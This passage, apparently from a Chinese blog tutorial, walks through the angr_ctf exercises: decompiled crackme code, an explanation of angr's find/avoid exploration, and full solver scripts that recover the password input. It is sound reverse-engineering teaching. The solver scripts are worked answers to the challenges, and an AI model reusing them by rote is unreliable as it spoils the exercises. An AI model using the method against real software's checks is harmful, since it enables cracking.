class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v11 <span class="token operator">&amp;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v12 <span class="token operator">&amp;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v11 <span class="token operator">&amp;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token comment">// 0x80cb9bf</span>                    <span class="token function">avoid_me</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>v12 <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">==</span> <span class="token punctuation">(</span>v11 <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token comment">// 0x80cffb7</span>                        <span class="token function">avoid_me</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v2 <span class="token operator">^</span> v6<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v6 <span class="token operator">&amp;</span> <span class="token number">64</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v2 <span class="token operator">&amp;</span> <span class="token number">64</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v6 <span class="token operator">&amp;</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v2 <span class="token operator">&amp;</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v6 <span class="token operator">&amp;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v2 <span class="token operator">&amp;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                        <span class="token comment">// 0x80d4149</span>                                        <span class="token function">avoid_me</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v6 <span class="token operator">&amp;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v2 <span class="token operator">&amp;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                            <span class="token comment">// 0x80d4379</span>                                            <span class="token function">avoid_me</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v6 <span class="token operator">&amp;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v2 <span class="token operator">&amp;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                                <span class="token comment">// 0x80d4491</span>                                                <span class="token function">avoid_me</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v6 <span class="token operator">&amp;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v2 <span class="token operator">&amp;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                                    <span class="token comment">// 0x80d4515</span>                                                    <span class="token function">avoid_me</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                    <span class="token keyword">if</span> <span class="token punctuation">(</span>v6 <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">==</span> <span class="token punctuation">(</span>v2 <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                                        <span class="token comment">// 0x80d455c</span>                                                        <span class="token operator">*</span>v8 <span class="token operator">=</span> v3<span class="token punctuation">;</span>                                                        <span class="token operator">*</span>v9 <span class="token operator">=</span> v7<span class="token punctuation">;</span>                                                        <span class="token function">maybe_good</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">int32_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>g2<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">int32_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>g2<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                                                        <span class="token comment">// 0x80d4542</span>                                                        <span class="token function">avoid_me</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                        <span class="token operator">*</span>v8 <span class="token operator">=</span> v3<span class="token punctuation">;</span>                                                        <span class="token operator">*</span>v9 <span class="token operator">=</span> v7<span class="token punctuation">;</span>                                                        <span class="token function">maybe_good</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">int32_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>g2<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">int32_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>g2<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                    <span class="token punctuation">&#125;</span>                                                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                                                    <span class="token keyword">if</span> <span class="token punctuation">(</span>v6 <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">==</span> <span class="token punctuation">(</span>v2 <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                                        <span class="token comment">// 0x80d4500</span>                                                        <span class="token operator">*</span>v8 <span class="token operator">=</span> v3<span class="token punctuation">;</span>                                                        <span class="token operator">*</span>v9 <span class="token operator">=</span> v7<span class="token punctuation">;</span>                                                        <span class="token function">maybe_good</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">int32_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>g2<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">int32_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>g2<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                                                        <span class="token comment">// 0x80d44e6</span>                                                        <span class="token function">avoid_me</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                        <span class="token operator">*</span>v8 <span class="token operator">=</span> v3<span class="token punctuation">;</span>                                                        <span class="token operator">*</span>v9 <span class="token operator">=</span> v7<span class="token punctuation">;</span>                                                        <span class="token function">maybe_good</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">int32_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>g2<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">int32_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>g2<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                    <span class="token punctuation">&#125;</span>                                                <span class="token punctuation">&#125;</span>                                            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                                                 <span class="token comment">// 在此之后一直是这样的重复代码</span>                                                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v6 <span class="token operator">&amp;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v2 <span class="token operator">&amp;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                                    <span class="token comment">// 0x80d442f</span>                                                    <span class="token function">avoid_me</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                    <span class="token keyword">if</span> <span class="token punctuation">(</span>v6 <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">==</span> <span class="token punctuation">(</span>v2 <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                                        <span class="token comment">// 0x80d4479</span>                                                        <span class="token operator">*</span>v8 <span class="token operator">=</span> v3<span class="token punctuation">;</span>                                                        <span class="token operator">*</span>v9 <span class="token operator">=</span> v7<span class="token punctuation">;</span>                                                        <span class="token function">maybe_good</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">int32_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>g2<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">int32_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>g2<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                                                        <span class="token comment">// 0x80d445c</span>                                                        <span class="token function">avoid_me</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                        <span class="token operator">*</span>v8 <span class="token operator">=</span> v3<span class="token punctuation">;</span>                                                        <span class="token operator">*</span>v9 <span class="token operator">=</span> v7<span class="token punctuation">;</span>                                                        <span class="token function">maybe_good</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">int32_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>g2<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">int32_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>g2<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                    <span class="token punctuation">&#125;</span>                                                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                                                    <span class="token keyword">if</span> <span class="token punctuation">(</span>v6 <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">==</span> <span class="token punctuation">(</span>v2 <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                                        <span class="token comment">// 0x80d4417</span>                                                        <span class="token operator">*</span>v8 <span class="token operator">=</span> v3<span class="token punctuation">;</span>                                                        <span class="token operator">*</span>v9 <span class="token operator">=</span> v7<span class="token punctuation">;</span>                                                        <span class="token function">maybe_good</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">int32_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>g2<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">int32_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>g2<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                                                        <span class="token comment">// 0x80d43fa</span>                                                        <span class="token function">avoid_me</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                        <span class="token operator">*</span>v8 <span class="token operator">=</span> v3<span class="token punctuation">;</span>                                                        <span class="token operator">*</span>v9 <span class="token operator">=</span> v7<span class="token punctuation">;</span>                                                        <span class="token function">maybe_good</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">int32_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>g2<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">int32_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>g2<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                    <span class="token punctuation">&#125;</span>                                                <span class="token punctuation">&#125;</span>                                            <span class="token punctuation">&#125;</span>          <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">int32_t</span> result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// 0x80d457e</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>v1 <span class="token operator">!=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 0x80d4580</span>        <span class="token function">__stack_chk_fail</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        result <span class="token operator">=</span> <span class="token operator">&amp;</span>g2<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 0x80d4585</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>可以看出程序由大量的if语句堆砌，非常适合用符号执行的方式遍历路径，为了减少遍历的路径数，提高搜索效率，我们应该避免让程序进入我们不希望执行的分支中，在本题中就是<code>avoid_me()</code>，这就用到了<code>explore()</code>的另一参数<code>avoid</code>，它用于指定不希望程序进入的路径。</p><p>下面给出题解，并附上必要注释（前面已经讲过的内容会简略）：</p><blockquote><p>两个必要的地址信息在上述的源代码中已存在</p></blockquote><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  path_to_binary <span class="token operator">=</span> <span class="token string">'01_angr_avoid'</span>  <span class="token comment"># 加载程序为Project对象</span>  project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>  <span class="token comment">#　获取初始化状态</span>  initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 模拟执行</span>  simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>  <span class="token comment">#　我们想要进入的分支地址，此处对应Good Job的语句　</span>  print_good_address <span class="token operator">=</span> <span class="token number">0x80485ff</span>  <span class="token comment"># 检查源代码中 Good Job对应地址</span>  <span class="token comment"># 不希望执行的分支，此处对应avoid_me()函数的地址</span>  will_not_succeed_address <span class="token operator">=</span> <span class="token number">0x80485a8</span>  <span class="token comment"># 检查源代码中 avoid_me()对应地址</span>  simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>print_good_address<span class="token punctuation">,</span> avoid<span class="token operator">=</span>will_not_succeed_address<span class="token punctuation">)</span>  <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    solution <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Success, flag is &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>solution<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210501165557.png" alt=""></p><blockquote><p>你可以尝试去掉avoid参数，同样能够达到目的，但时间上花销会更多~</p></blockquote><h2 id="02-angr-find-condition"><a href="#02-angr-find-condition" class="headerlink" title="02_angr_find_condition"></a>02_angr_find_condition</h2><p>本题与第一题是一样的，只不过顾名思义，通过<code>condition</code>的方式来选择<code>find</code>和<code>avoid</code>的分支，之前我们一直是反编译之后手动填写相应的语句内存地址，实际上在选择分支的时候可以根据对应的输出结果来判断，在<code>explore</code>的时候传入函数，用于指定什么情况下选择该路径，什么时候跳过该路径，即定义：</p><ul><li><code>is_successful(state)</code>: 进入分支的条件</li><li><code>should_abort(state)</code>: 跳过分支的条件</li></ul><p>最终代码如下：</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path_to_binary <span class="token operator">=</span> <span class="token string">'02_angr_find_condition'</span>    project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>    initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span>    simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>        stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment"># 在对输出进行判断的时候有两种方式，str compare or bytes compare</span>        <span class="token keyword">return</span> <span class="token boolean">True</span> <span class="token keyword">if</span> <span class="token string">'Good Job.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">False</span>        <span class="token comment"># return True if b'Good Job.' in stdout_output else False</span>    <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>        stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span> <span class="token keyword">if</span> <span class="token string">'Try again.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">False</span>    simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>    <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>        solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        solution <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Success, flag is &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>solution<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210501165755.png" alt=""></p><h2 id="03-angr-symbolic-registers"><a href="#03-angr-symbolic-registers" class="headerlink" title="03_angr_symbolic_registers"></a>03_angr_symbolic_registers</h2><p>先看下反编译代码：</p><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// ebx</span>  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// edx</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// ST1C_4</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// ST14_4</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// [esp+8h] [ebp-10h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment">// [esp+Ch] [ebp-Ch]</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Enter the password: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v4 <span class="token operator">=</span> <span class="token function">get_user_input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v6 <span class="token operator">=</span> v5<span class="token punctuation">;</span>  v7 <span class="token operator">=</span> <span class="token function">complex_function_1</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>  v9 <span class="token operator">=</span> <span class="token function">complex_function_2</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>  v10 <span class="token operator">=</span> <span class="token function">complex_function_3</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v7 <span class="token operator">||</span> v9 <span class="token operator">||</span> v10 <span class="token punctuation">)</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Try again."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Good Job."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">get_user_input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// [esp+0h] [ebp-18h]</span>  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// [esp+4h] [ebp-14h]</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// [esp+8h] [ebp-10h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [esp+Ch] [ebp-Ch]</span>  v4 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%x %x %x"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> v1<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> __cdecl <span class="token function">complex_function_1</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a1 <span class="token operator">^</span> <span class="token number">0x446D96EE</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">65034369</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span 